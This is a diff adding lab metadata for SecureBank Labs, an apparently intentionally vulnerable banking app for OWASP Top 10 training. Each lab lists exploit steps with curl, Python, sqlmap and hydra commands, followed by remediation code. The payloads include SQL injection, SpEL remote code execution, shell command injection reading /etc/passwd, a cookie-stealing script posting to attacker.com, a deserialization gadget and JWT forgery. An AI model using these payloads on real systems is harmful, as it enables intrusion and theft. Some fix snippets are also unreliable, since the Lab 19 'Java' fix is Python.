@@ -1,0 +1,1040 @@
+# SecureBank Labs — lab metadata (source of truth for the in-app lab panel)
+#
+# scripts/sync-labs.py merges this file with the real Java sources to produce
+# backend/core/src/main/resources/labs/labs.json. The "Affected Code" tab is
+# therefore always the current source, never a stale copy.
+#
+# Fields:
+#   id          - zero-padded lab number, used in the URL /lab/<id>
+#   category    - OWASP Top 10 2025 category
+#   title       - short lab title
+#   severity    - Low | Medium | High
+#   objective   - what the trainee is trying to achieve
+#   exploit     - ordered list of exploit steps (may contain shell/curl blocks)
+#   hint        - nudge, shown on the Hint tab
+#   fix         - the remediation, shown on the Fix tab
+#   source      - path (relative to backend/) of the vulnerable Java file
+#   anchors     - substrings that mark the start/end of the interesting code block
+
+labs:
+  - id: 1
+    category: A01
+    categoryName: Broken Access Control
+    title: "IDOR: View Another Customer's Account"
+    severity: Low
+    objective: >-
+      Access account #ACC-1002 (bob's) while authenticated as alice, without
+      authorization checks.
+    exploit: |
+      1. Log in as `alice / password123` and note alice's account id (1) on the dashboard.
+      2. Navigate to **My Accounts → Account Detail**. The URL is `/banking/accounts/1`.
+      3. Change the URL to `/banking/accounts/2` — bob's full account appears with
+         balance and transaction history.
+      4. Confirm via the API:
+
+         ```bash
+         TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
+           -H "Content-Type: application/json" \
+           -d '{"username":"alice","password":"password123"}' \
+           | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/accounts/2
+         ```
+    hint: >-
+      The endpoint accepts an account id in the path. Ask what it does with the
+      authenticated user's id before it returns the record.
+    fix: >-
+      Compare the account's owner with the caller before returning it:
+
+      ```java
+      if (!Objects.equals(account.getUserId(), caller.getId())) {
+          return ResponseEntity.status(HttpStatus.FORBIDDEN)
+                  .body(Map.of("error", "Not your account"));
+      }
+      ```
+
+      Authorisation must be enforced server-side on every single request.
+    source: core/src/main/java/com/securebank/lab/a01/Lab1IdorController.java
+    anchors:
+      - "Account account = accounts.findById(id).orElse(null);"
+
+  - id: 2
+    category: A01
+    categoryName: Broken Access Control
+    title: "Privilege Escalation: Customer → Admin"
+    severity: Medium
+    objective: >-
+      Call the admin user-management endpoint as a regular customer.
+    exploit: |
+      1. Log in as alice and capture the JWT token.
+      2. Call the admin endpoint directly — the frontend never links to it, but it is
+         unprotected:
+
+         ```bash
+         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/admin/users
+         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/admin/accounts
+         ```
+      3. Observe the full user list including hashed passwords and email addresses.
+    hint: >-
+      The filter that guards these endpoints checks whether a token was presented,
+      but not what role the token carries.
+    fix: >-
+      Add a role check so that only admin tokens are accepted:
+
+      ```java
+      if (!"admin".equals(caller.getRole())) {
+          return ResponseEntity.status(HttpStatus.FORBIDDEN)
+                  .body(Map.of("error", "Admin role required"));
+      }
+      ```
+
+      Better: express this as a `@RequireRole("admin")` annotation applied at the
+      method level, so the check cannot be forgotten on a new endpoint.
+    source: core/src/main/java/com/securebank/lab/a01/Lab2PrivilegeEscalationController.java
+    anchors:
+      - "public ResponseEntity<?> users()"
+
+  - id: 3
+    category: A01
+    categoryName: Broken Access Control
+    title: "SSRF: Internal Metadata Fetch"
+    severity: High
+    objective: >-
+      Make the server fetch an internal URL that you choose.
+    exploit: |
+      1. The statement-email feature POSTs to `/api/a01/accounts/statement-email`.
+      2. Supply an attacker-controlled callback URL:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a01/accounts/statement-email \
+           -H "Authorization: Bearer $TOKEN" \
+           -H "Content-Type: application/json" \
+           -d '{"account_id": 1, "callback_url": "http://169.254.169.254/latest/meta-data/"}'
+         ```
+      3. On cloud infrastructure this returns AWS/GCP instance metadata including IAM
+         credentials.
+      4. On a local Docker network, pivot to the internal report service that is not
+         reachable from the internet:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a01/accounts/statement-email \
+           -H "Authorization: Bearer $TOKEN" \
+           -H "Content-Type: application/json" \
+           -d '{"account_id": 1, "callback_url": "http://report:8081/"}'
+         ```
+    hint: >-
+      What happens to the `callback_url` value between it arriving in the JSON body and
+      the HTTP request being made?
+    fix: >-
+      Validate the URL before fetching it: resolve the hostname, reject private,
+      loopback, link-local and metadata address ranges, and allow only an explicit
+      allowlist of hosts:
+
+      ```java
+      URI uri = URI.create(callbackUrl);
+      if (!ALLOWED_HOSTS.contains(uri.getHost())) {
+          return ResponseEntity.badRequest().body(Map.of("error", "Unsupported callback host"));
+      }
+      ```
+    source: core/src/main/java/com/securebank/lab/a01/Lab3SsrfController.java
+    anchors:
+      - "HttpResponse<String> response = client.send("
+
+  - id: 4
+    category: A02
+    categoryName: Security Misconfiguration
+    title: "Debug Mode: Stack Trace Exposes Config"
+    severity: Low
+    objective: >-
+      Trigger an unhandled exception to view the application's internal state.
+    exploit: |
+      1. Navigate to `http://localhost:8080/api/a02/debug`.
+      2. The response contains:
+         - the full Python/Java stack trace
+         - `application.yml` values including `jwt.secret` and `spring.datasource.url`
+         - the installed middleware list
+         - local variable values at every frame
+      3. Any unhandled error returns the same detail, because
+         `server.error.include-stacktrace=always` is set.
+      4. Demonstrate how `jwt.secret` can be used to forge a valid session token (Lab 8).
+    hint: >-
+      Look for the endpoint that prints the Spring `Environment`.
+    fix: >-
+      Set `server.error.include-stacktrace=never` and `server.error.include-message=never`
+      in production. Serve a generic error page and log the detail server-side only.
+    source: core/src/main/java/com/securebank/lab/a02/Lab4DebugController.java
+    anchors:
+      - "public ResponseEntity<?> debug()"
+
+  - id: 5
+    category: A02
+    categoryName: Security Misconfiguration
+    title: "Default Admin Credentials"
+    severity: Low
+    objective: >-
+      Log into the admin console with the default credentials.
+    exploit: |
+      1. Navigate to `http://localhost/admin-console`.
+      2. Enter `admin / admin`.
+      3. Observe full ORM-backed access: browse all users, accounts and transfers.
+      4. Create a new admin user via the UI — this demonstrates persistence.
+    hint: >-
+      The seed data always ships one admin account. What password does it use?
+    fix: >-
+      Use strong, unique admin credentials stored in a secret manager, restrict the
+      admin console to an internal network, and disable it entirely in production.
+    source: core/src/main/java/com/securebank/lab/a02/Lab5DefaultAdminController.java
+    anchors:
+      - "public ResponseEntity<?> login("
+
+  - id: 6
+    category: A02
+    categoryName: Security Misconfiguration
+    title: "Sensitive File Exposure: .env, .git, backup.zip"
+    severity: Medium
+    objective: >-
+      Recover secrets and the full database from files served by the web root.
+    exploit: |
+      1. Navigate to `http://localhost/.env` — full environment file with fake
+         AWS/Stripe credentials.
+      2. Navigate to `http://localhost/.git/config` — git remote URL revealing the
+         internal code repository.
+      3. Navigate to `http://localhost/backup.zip` — downloads a PostgreSQL database
+         backup containing all users and transactions.
+      4. Inspect the backup:
+
+         ```bash
+         unzip backup.zip
+         pg_restore -l securebank.dump      # list the tables
+         pg_restore -d securebank_restore securebank.dump
+         ```
+      5. Find the MD5 password hashes — crack them in the next lab.
+    hint: >-
+      The static resource directory is the web root. What was placed in it?
+    fix: >-
+      Isolate static files in a dedicated directory outside the web root. Never serve
+      `.env` or `.git` from a web server. Use `.gitignore` and point `STATIC_ROOT` at a
+      path that contains no sensitive files. Add a build step that fails if a secret
+      file is detected in the static tree.
+    source: core/src/main/java/com/securebank/lab/a02/Lab6StaticExposureController.java
+    anchors:
+      - "public ResponseEntity<?> exposedFiles()"
+
+  - id: 7
+    category: A04
+    categoryName: Cryptographic Failures
+    title: "MD5 Password Hashing: Crack with Hashcat"
+    severity: Medium
+    objective: >-
+      Crack a user's password from their MD5 hash.
+    exploit: |
+      1. Obtain hashes via the exposed `backup.zip` (Lab 6) or via the crypto API:
+
+         ```bash
+         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/hashes
+         ```
+      2. Save alice's hash to a file:
+
+         ```bash
+         echo "482c811da5d5b4bc6d497ffa98491e38" > hashes.txt
+         ```
+      3. Crack with hashcat:
+
+         ```bash
+         hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+         ```
+      4. Result: `password123` in seconds (MD5 + no salt = trivially crackable).
+      5. Without hashcat, the in-app cracker does it for you:
+
+         ```bash
+         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/crack
+         ```
+    hint: >-
+      `hashcat -m 0` is raw MD5. Why does the absence of a salt matter so much?
+    fix: >-
+      Use a deliberately slow, salted password hashing function:
+
+      ```java
+      String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
+      boolean ok = BCrypt.checkpw(password, hash);
+      ```
+
+      Never use MD5, SHA-1 or SHA-256 alone for passwords.
+    source: core/src/main/java/com/securebank/lab/a04/Lab7CryptoController.java
+    anchors:
+      - "public ResponseEntity<?> hashes()"
+
+  - id: 8
+    category: A04
+    categoryName: Cryptographic Failures
+    title: "Hardcoded Weak JWT Secret: Forge Admin Token"
+    severity: Medium
+    objective: >-
+      Forge a JWT with an admin role using the hardcoded secret.
+    exploit: |
+      1. Log in as alice and copy the JWT token.
+      2. Decode it at jwt.io — observe `{"role": "customer", "user_id": 1}`.
+      3. The secret `"secret"` is visible in the application startup log:
+
+         ```bash
+         docker compose logs backend | grep SECRET_KEY
+         ```
+      4. Forge an admin token:
+
+         ```python
+         import jwt
+         token = jwt.encode(
+             {"user_id": 3, "role": "admin", "username": "admin"},
+             "secret", algorithm="HS256")
+         print(token)
+         ```
+      5. Use the forged token:
+
+         ```bash
+         curl -H "Authorization: Bearer <forged_token>" http://localhost:8080/api/a01/admin/users
+         ```
+    hint: >-
+      The signing key is loaded from a property that is committed to the repository.
+    fix: >-
+      Generate a cryptographically strong secret and load it only from the environment:
+
+      ```bash
+      python3 -c "import secrets; print(secrets.token_hex(32))"
+      ```
+
+      Rotate it on a schedule and never log it.
+    source: core/src/main/java/com/securebank/core/security/JwtService.java
+    anchors:
+      - "log.info(\"JWT signing key loaded"
+
+  - id: 9
+    category: A04
+    categoryName: Cryptographic Failures
+    title: "PII in Cleartext API Responses and Logs"
+    severity: Low
+    objective: >-
+      Observe personal and financial data leaving the API in plaintext and landing in
+      the application log.
+    exploit: |
+      1. Authenticate and call the profile endpoint:
+
+         ```bash
+         curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/profile
+         ```
+      2. The response includes the full account number, sort code, email, balance and
+         full name — in plaintext.
+      3. Check the Docker logs to see the same PII written to stdout:
+
+         ```bash
+         docker compose logs backend | grep "profile lookup"
+         ```
+      4. Traffic is intercepted trivially because there is no HTTPS in dev.
+    hint: >-
+      Compare the JSON response with the log output.
+    fix: >-
+      Mask sensitive fields in responses (`ACC-****1001`, `20-**-**`). Never log PII.
+      Use TLS in transit and apply field-level encryption at rest.
+    source: core/src/main/java/com/securebank/lab/a04/Lab9PiiController.java
+    anchors:
+      - "Map<String, Object> response = Map.of("
+
+  - id: 10
+    category: A05
+    categoryName: Injection
+    title: "SQL Injection: Login Bypass & Data Dump"
+    severity: High
+    objective: >-
+      Bypass authentication and dump the database.
+    exploit: |
+      **Login bypass**
+
+      1. At the login form, enter:
+         - Username: `admin' --`
+         - Password: `anything`
+      2. The raw SQL becomes
+         `SELECT id, username, password_hash, email, role FROM users WHERE username='admin' --' AND password='...'`
+      3. The comment skips the password check — login succeeds as admin.
+
+      **Data dump with sqlmap**
+
+      ```bash
+      sqlmap -u "http://localhost:8080/api/a05/auth/login" \
+        --data='{"username":"test","password":"test"}' \
+        --dbms=PostgreSQL --dump --batch
+      ```
+
+      **UNION-based dump**
+
+      ```bash
+      curl "http://localhost:8080/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--"
+      ```
+    hint: >-
+      The login query is built by string concatenation. What does the `--` comment
+      do to the rest of the statement?
+    fix: >-
+      Use parameterised queries:
+
+      ```java
+      PreparedStatement ps = conn.prepareStatement(
+          "SELECT id, username, password_hash, email, role FROM users WHERE username = ? AND password_hash = ?");
+      ps.setString(1, username);
+      ps.setString(2, passwordHash);
+      ```
+
+      Never interpolate user input into SQL text.
+    source: core/src/main/java/com/securebank/lab/a05/Lab10SqlInjectionController.java
+    anchors:
+      - "String sql = \"SELECT id, username, password_hash, email, role FROM users WHERE username = '\""
+
+  - id: 11
+    category: A05
+    categoryName: Injection
+    title: "SSTI: SpEL Remote Code Execution via Transaction Remark"
+    severity: High
+    objective: >-
+      Achieve remote code execution through the transaction remark field.
+    exploit: |
+      1. After making a transfer, add a remark via the API:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
+           -H "Authorization: Bearer $TOKEN" \
+           -H "Content-Type: application/json" \
+           -d '{"remark": "7*7"}'
+         ```
+      2. The response contains `Remark: 49` — expression evaluation confirmed.
+      3. Read a server file:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
+           -H "Authorization: Bearer $TOKEN" \
+           -H "Content-Type: application/json" \
+           -d '{"remark": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"}).toString()"}'
+         ```
+      4. The full classic chain, using the `StandardEvaluationContext` so that
+         `T(...)` type references are available:
+         `#{T(java.lang.Runtime).getRuntime().exec('id')}`
+    hint: >-
+      The remark is evaluated as an expression, not printed as text. Which evaluation
+      context is used, and does it allow type references?
+    fix: >-
+      Never evaluate user input as an expression. If a template is needed, pass the
+      user value as a *variable* to a fixed template:
+
+      ```java
+      return ResponseEntity.ok("<p>Remark: " + escapeHtml(remark) + "</p>");
+      ```
+    source: core/src/main/java/com/securebank/lab/a05/Lab11SstiController.java
+    anchors:
+      - "Expression expression = parser.parseExpression(remark);"
+
+  - id: 12
+    category: A05
+    categoryName: Injection
+    title: "SSTI + OS Command Injection: Report Service"
+    severity: High
+    objective: >-
+      Extract internal config via template injection, then get RCE via command injection.
+    exploit: |
+      **Template injection**
+
+      ```bash
+      curl -X POST http://localhost:8081/api/report/report/generate \
+        -H "Content-Type: application/json" \
+        -d '{"account_id": "1001", "template": "Secret: ${config.secretKey}"}'
+
+      curl -X POST http://localhost:8081/api/report/report/generate \
+        -H "Content-Type: application/json" \
+        -d '{"account_id": "1001", "template": "${config.dbPath}"}'
+      ```
+
+      **OS command injection**
+
+      ```bash
+      curl -X POST http://localhost:8081/api/report/report/date-filter \
+        -H "Content-Type: application/json" \
+        -d '{"from_date": "2024-01-01", "to_date": "2024-12-31"}'
+
+      curl -X POST http://localhost:8081/api/report/report/date-filter \
+        -H "Content-Type: application/json" \
+        -d "{\"from_date\": \"2024-01-01' && id && echo '\", \"to_date\": \"2024-12-31\"}"
+
+      curl -X POST http://localhost:8081/api/report/report/date-filter \
+        -H "Content-Type: application/json" \
+        -d "{\"from_date\": \"2024-01-01' && cat /etc/passwd && echo '\", \"to_date\": \"2024-12-31\"}"
+      ```
+    hint: >-
+      Two separate bugs on one service. The template string comes from the request
+      body, and the date is concatenated into a shell command.
+    fix: >-
+      **Template injection:** never accept a user-supplied template. Render from a
+      fixed set of server-side templates with dynamic values passed as model
+      attributes.
+
+      **Command injection:** parse and validate the date, then pass values as
+      separate arguments rather than through `sh -c`:
+
+      ```java
+      LocalDate from = LocalDate.parse(fromDate, DateTimeFormatter.ISO_LOCAL_DATE);
+      ProcessBuilder pb = new ProcessBuilder("date", "--from", from.toString());
+      ```
+    source: report/src/main/java/com/securebank/lab/a05/report/ReportController.java
+    anchors:
+      - "public ResponseEntity<?> generate("
+
+  - id: 13
+    category: A05
+    categoryName: Injection
+    title: "Stored XSS: Transaction Notes"
+    severity: Medium
+    objective: >-
+      Store an XSS payload that fires for every user viewing the transfers page.
+    exploit: |
+      1. Log in as alice.
+      2. Submit a transfer with a malicious note:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a05/transfers/send \
+           -H "Authorization: Bearer $TOKEN" \
+           -H "Content-Type: application/json" \
+           -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}'
+         ```
+      3. Navigate to **Transfers** in the banking app — the alert fires immediately.
+      4. Log in as bob and navigate to Transfers — the same alert fires for bob too.
+      5. Demonstrate cookie theft with a more realistic payload:
+
+         ```html
+         <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+         ```
+    hint: >-
+      The note is stored and later inserted into the page. Look at how the frontend
+      renders that field.
+    fix: >-
+      Sanitise the HTML before rendering it:
+
+      ```jsx
+      import DOMPurify from 'dompurify';
+      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(txn.note) }} />
+      ```
+
+      Better still, render the value as plain text and never use
+      `dangerouslySetInnerHTML` for user data:
+
+      ```jsx
+      <div>{txn.note}</div>
+      ```
+    source: core/src/main/java/com/securebank/lab/a05/Lab13XssController.java
+    anchors:
+      - "public ResponseEntity<?> send("
+
+  - id: 14
+    category: A06
+    categoryName: Insecure Design
+    title: "Business Logic: Negative Transfer Amount"
+    severity: Medium
+    objective: >-
+      Create money from nothing by sending a negative transfer.
+    exploit: |
+      1. Check alice's initial balance (£4,200).
+      2. Send a negative transfer from bob to alice:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a06/transfers/ \
+           -H "Content-Type: application/json" \
+           -d '{"from_account_id": 2, "to_account_id": 1, "amount": -1000}'
+         ```
+      3. Refresh alice's account — the balance increased to £5,200.
+      4. Bob's balance also increased (both sides of a negative transfer increase).
+      5. Demonstrate: alice sends `-999999` from her own account to herself →
+         unlimited balance.
+    hint: >-
+      Is the amount checked for sign, or only for type and range?
+    fix: >-
+      Validate the amount as a strictly positive value at the input boundary:
+
+      ```java
+      if (amount == null || amount.signum() <= 0) {
+          throw new ValidationException("Amount must be positive");
+      }
+      ```
+
+      This is an **insecure design** flaw: the rule was simply never considered
+      during design, so no single line of code was ever wrong.
+    source: core/src/main/java/com/securebank/lab/a06/Lab14BusinessLogicController.java
+    anchors:
+      - "public ResponseEntity<?> transfer("
+
+  - id: 15
+    category: A06
+    categoryName: Insecure Design
+    title: "Mass Assignment: Self-Promote to Admin"
+    severity: Medium
+    objective: >-
+      Promote a customer account to admin by exploiting an over-permissive request
+      binding.
+    exploit: |
+      1. Log in as alice and get a token.
+      2. PATCH the profile endpoint including the `role` field:
+
+         ```bash
+         curl -X PATCH http://localhost:8080/api/a06/profile \
+           -H "Content-Type: application/json" \
+           -H "Authorization: Bearer $TOKEN" \
+           -d '{"username": "alice", "email": "alice@bank.com", "role": "admin"}'
+         ```
+      3. Fetch the profile back and confirm `"role": "admin"`.
+      4. Now use admin endpoints — alice has full admin access.
+    hint: >-
+      Which fields does the request object actually declare? What happens to the
+      ones it declares?
+    fix: >-
+      Make privileged fields read-only, and use separate request types for read and
+      write:
+
+      ```java
+      public record ProfileUpdateRequest(String username, String email) { }
+      ```
+
+      Role changes should be a privileged admin operation, exposed on a separate
+      endpoint that requires admin authorisation.
+    source: core/src/main/java/com/securebank/lab/a06/Lab15MassAssignmentController.java
+    anchors:
+      - "public ResponseEntity<?> updateProfile("
+
+  - id: 16
+    category: A06
+    categoryName: Insecure Design
+    title: "Account Enumeration via Error Messages"
+    severity: Low
+    objective: >-
+      Enumerate valid usernames using different error messages.
+    exploit: |
+      1. Try logging in with a non-existent user:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a06/auth/login/ \
+           -H "Content-Type: application/json" \
+           -d '{"username": "notauser", "password": "anything"}'
+         # {"error": "User not found"}
+         ```
+      2. Try with a real user:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a06/auth/login/ \
+           -H "Content-Type: application/json" \
+           -d '{"username": "alice", "password": "wrongpassword"}'
+         # {"error": "Incorrect password"}
+         ```
+      3. Script username enumeration using this difference:
+
+         ```python
+         import requests
+         wordlist = ["alice", "bob", "admin", "charlie", "dave"]
+         for user in wordlist:
+             r = requests.post("http://localhost:8080/api/a06/auth/login/",
+                               json={"username": user, "password": "x"})
+             if "Incorrect password" in r.text:
+                 print(f"[+] Valid user: {user}")
+         ```
+    hint: >-
+      Compare the two error responses character by character.
+    fix: >-
+      Return an identical message for every failure:
+
+      ```java
+      return ResponseEntity.status(401).body(Map.of("error", "Invalid credentials"));
+      ```
+
+      Equalise the timing too, so that a missing user and a wrong password take the
+      same time to answer.
+    source: core/src/main/java/com/securebank/lab/a06/Lab16EnumerationController.java
+    anchors:
+      - "public ResponseEntity<?> login("
+
+  - id: 17
+    category: A07
+    categoryName: Authentication Failures
+    title: "Brute-Force Login: No Rate Limiting"
+    severity: Low
+    objective: >-
+      Brute-force alice's password with no lockout in place.
+    exploit: |
+      ```bash
+      # Using hydra
+      hydra -l alice -P /usr/share/wordlists/rockyou.txt \
+        localhost http-post-form \
+        "/api/a07/auth/login:username=^USER^&password=^PASS^:Invalid credentials" \
+        -t 64
+
+      # Or using a simple Python script:
+      python3 -c "
+      import requests
+      with open('/usr/share/wordlists/common-passwords.txt') as f:
+          for line in f:
+              pw = line.strip()
+              r = requests.post('http://localhost:8080/api/a07/auth/login',
+                                json={'username':'alice','password':pw})
+              if 'token' in r.text:
+                  print('Found:', pw); break
+              print('Tried:', pw)
+      "
+      ```
+    hint: >-
+      How many failed attempts are needed before anything changes?
+    fix: >-
+      Add rate limiting and account lockout:
+
+      ```java
+      @RateLimiter(key = "#username", rate = "5/minute")
+      ```
+
+      Combine it with per-account lockout after N failures and a CAPTCHA on
+      web-facing login forms.
+    source: core/src/main/java/com/securebank/lab/a07/Lab17BruteForceController.java
+    anchors:
+      - "public ResponseEntity<?> login("
+
+  - id: 18
+    category: A07
+    categoryName: Authentication Failures
+    title: "Session Fixation"
+    severity: Medium
+    objective: >-
+      Pre-set a session id before login and hijack the session after authentication.
+    exploit: |
+      1. Obtain a session id before authenticating:
+
+         ```bash
+         curl -c cookies.txt -X POST http://localhost:8080/api/a07/session/init
+         ```
+      2. Log in using that same cookie. The application does **not** regenerate the
+         session id on login — the session is now authenticated:
+
+         ```bash
+         curl -c cookies.txt -b cookies.txt -X POST http://localhost:8080/api/a07/auth/login-session \
+           -H "Content-Type: application/json" \
+           -d '{"username":"alice","password":"password123"}'
+         ```
+      3. Use the same cookie from another client:
+
+         ```bash
+         curl -b cookies.txt http://localhost:8080/api/a07/session/whoami
+         ```
+      4. The attacker now holds alice's authenticated session.
+    hint: >-
+      Compare the `JSESSIONID` value before and after the login request.
+    fix: >-
+      Regenerate the session id on successful authentication:
+
+      ```java
+      HttpSession session = request.getSession(false);
+      if (session != null) {
+          session.invalidate();
+      }
+      session = request.getSession(true);
+      ```
+
+      Spring's `request.changeSessionId()` is the equivalent.
+    source: core/src/main/java/com/securebank/lab/a07/Lab18SessionController.java
+    anchors:
+      - "public ResponseEntity<?> loginSession("
+
+  - id: 19
+    category: A07
+    categoryName: Authentication Failures
+    title: "Insecure Password Reset: Predictable Token"
+    severity: High
+    objective: >-
+      Compute a valid password reset token without access to the target's email.
+    exploit: |
+      1. Request a reset for alice and note the timestamp:
+
+         ```bash
+         TIME=$(date +%s)
+         curl -X POST http://localhost:8080/api/a07/auth/reset-request \
+           -H "Content-Type: application/json" \
+           -d '{"username": "alice"}'
+         ```
+      2. Compute the token offline — the attacker knows the username and roughly
+         when the request was made:
+
+         ```python
+         import hashlib, time
+         username = "alice"
+         for offset in range(-30, 31):
+             ts = int(time.time()) + offset
+             token = hashlib.md5(f"{username}{ts}".encode()).hexdigest()
+             print(token)
+         ```
+      3. Submit the computed token:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a07/auth/reset-confirm \
+           -H "Content-Type: application/json" \
+           -d '{"token": "<computed_token>", "new_password": "hacked"}'
+         ```
+      4. Log in as alice with the new password.
+    hint: >-
+      The token is derived from two values an attacker already knows. How many
+      candidates are there?
+    fix: >-
+      Use a cryptographically random token:
+
+      ```java
+      String token = secrets.token_urlsafe(32);
+      ```
+
+      Store it with a one-hour expiry, delete it after a single use, and do not
+      return it in the response body.
+    source: core/src/main/java/com/securebank/lab/a07/Lab19ResetController.java
+    anchors:
+      - "public ResponseEntity<?> resetRequest("
+
+  - id: 20
+    category: A08
+    categoryName: Software & Data Integrity Failures
+    title: "Insecure Deserialization: RCE"
+    severity: High
+    objective: >-
+      Achieve remote code execution by uploading a malicious payload file.
+    exploit: |
+      1. Create the malicious payload — a JSON document whose type metadata names a
+         gadget class:
+
+         ```python
+         import json
+         # CommonsCollections / InvokerTransformer chain from commons-collections 3.2.1.
+         # Jackson's As.PROPERTY default typing reads the type id from the "@class"
+         # property, so that is the key the class name goes in.
+         payload = {
+             "@class": "org.apache.commons.collections.functors.InvokerTransformer",
+             "functor": {"@class": "java.lang.Class", "className": "java.lang.Runtime"},
+             "args": ["getRuntime"],
+         }
+         with open('payload.json', 'w') as f:
+             json.dump(payload, f)
+         ```
+      2. Upload it to the account import endpoint:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a08/integrity/import-account \
+           -H "Authorization: Bearer $TOKEN" \
+           -F "data=@payload.json"
+         ```
+      3. The gadget chain executes on the server during deserialisation.
+      4. Escalate to a reverse shell by changing the `args` to a shell command.
+    hint: >-
+      The import endpoint reads a file and deserialises it. What controls which class
+      the deserialiser instantiates?
+    fix: >-
+      Never deserialize untrusted data into polymorphic types. Use JSON with a fixed
+      schema, or validate against a schema with `jsonschema` before use. Never enable
+      Jackson's `activateDefaultTyping` on an ObjectMapper that reads user input.
+    source: core/src/main/java/com/securebank/lab/a08/Lab20DeserializationController.java
+    anchors:
+      - "public ResponseEntity<?> importAccount("
+
+  - id: 21
+    category: A08
+    categoryName: Software & Data Integrity Failures
+    title: "JWT Algorithm Confusion: alg:none Bypass"
+    severity: Medium
+    objective: >-
+      Forge an admin JWT by stripping the signature and setting `alg: none`.
+    exploit: |
+      1. Get any valid JWT from login.
+      2. Decode the header and payload (base64url).
+      3. Forge an admin token with `alg: none`:
+
+         ```python
+         import base64, json
+
+         def b64url(data):
+             return base64.urlsafe_b64encode(
+                 json.dumps(data).encode()).rstrip(b'=').decode()
+
+         header = {"alg": "none", "typ": "JWT"}
+         payload = {"user_id": 3, "username": "admin", "role": "admin"}
+         forged = f"{b64url(header)}.{b64url(payload)}."
+         print(forged)
+         ```
+      4. Use the forged token:
+
+         ```bash
+         curl -H "Authorization: Bearer <forged_token>" http://localhost:8080/api/a01/admin/users
+         ```
+    hint: >-
+      The token's own header says which algorithm to use. Who controls that header?
+    fix: >-
+      Pin the algorithm explicitly and never honour the token's claim about itself:
+
+      ```java
+      Jwts.parser()
+          .verifyWith(key)
+          .build()
+          .parseSignedClaims(token);
+      ```
+
+      Never pass `options={"verify_signature": false}`, and reject `alg: none`
+      outright.
+    source: core/src/main/java/com/securebank/core/security/JwtService.java
+    anchors:
+      - "if (\"none\".equalsIgnoreCase(String.valueOf(alg))) {"
+
+  - id: 22
+    category: A08
+    categoryName: Software & Data Integrity Failures
+    title: "Unverified File Upload"
+    severity: High
+    objective: >-
+      Upload a file of any type and have it served back from the web root.
+    exploit: |
+      1. Upload a file:
+
+         ```bash
+         echo "SHELL_HERE" > shell.txt
+         curl -X POST http://localhost:8080/api/a08/kyc-upload \
+           -H "Authorization: Bearer $TOKEN" \
+           -F "file=@shell.txt"
+         # {"url": "/uploads/shell.txt"}
+         ```
+      2. Access the uploaded file directly:
+
+         ```bash
+         curl http://localhost:8080/uploads/shell.txt
+         ```
+      3. Upload a `.py` file to demonstrate that any extension is accepted:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a08/kyc-upload \
+           -H "Authorization: Bearer $TOKEN" \
+           -F "file=@shell.py"
+         ```
+      4. Attempt path traversal in the filename:
+
+         ```bash
+         curl -X POST http://localhost:8080/api/a08/kyc-upload \
+           -H "Authorization: Bearer $TOKEN" \
+           -F "file=@shell.txt;filename=../../shell.txt"
+         ```
+    hint: >-
+      What is used as the stored filename? Where does the file end up?
+    fix: >-
+      Validate the extension and MIME type server-side, generate a UUID filename,
+      store uploads outside the web root, and serve them through a handler that sets
+      `Content-Disposition: attachment` and a fixed content type.
+    source: core/src/main/java/com/securebank/lab/a08/Lab22UploadController.java
+    anchors:
+      - "public ResponseEntity<?> upload("
+
+  - id: 23
+    category: A10
+    categoryName: Mishandling of Exceptional Conditions
+    title: "Verbose Error: Stack Trace with Config Values"
+    severity: Low
+    objective: >-
+      Trigger an unhandled exception to extract internal configuration.
+    exploit: |
+      ```bash
+      # Pass a non-integer ID to trigger NumberFormatException
+      curl "http://localhost:8080/api/a10/transfers/account-summary?id=abc"
+      ```
+      The response contains the full Java stack trace including:
+      - `spring.datasource.url` with the database connection details
+      - `jwt.secret` = `"secret"`
+      - the Spring Boot version and installed packages
+      - the internal call chain
+    hint: >-
+      The id is converted to an integer without being validated first.
+    fix: >-
+      Validate the input and handle the error explicitly:
+
+      ```java
+      int id;
+      try {
+          id = Integer.parseInt(request.getParameter("id"));
+      } catch (NumberFormatException e) {
+          return ResponseEntity.badRequest().body(Map.of("error", "Invalid id"));
+      }
+      ```
+
+      Add a global error handler that logs the detail and returns a generic message.
+    source: core/src/main/java/com/securebank/lab/a10/Lab23VerboseErrorController.java
+    anchors:
+      - "public ResponseEntity<?> accountSummary("
+
+  - id: 24
+    category: A10
+    categoryName: Mishandling of Exceptional Conditions
+    title: "Error-Based Info Disclosure: Type Coercion"
+    severity: Medium
+    objective: >-
+      Send a string as an amount to trigger a TypeError revealing ORM internals.
+    exploit: |
+      ```bash
+      curl -X POST http://localhost:8080/api/a10/transfers/send \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d '{"from_account_id": 1, "to_account_id": 2, "amount": "notanumber"}'
+      ```
+      The response reveals:
+      - internal variable names (`amount`, `balance`)
+      - the ORM query string with table and column names
+      - Java type information
+    hint: >-
+      What type does the `amount` field have, and when is it converted?
+    fix: >-
+      Validate the amount as a positive number at the input boundary, before any
+      processing happens:
+
+      ```java
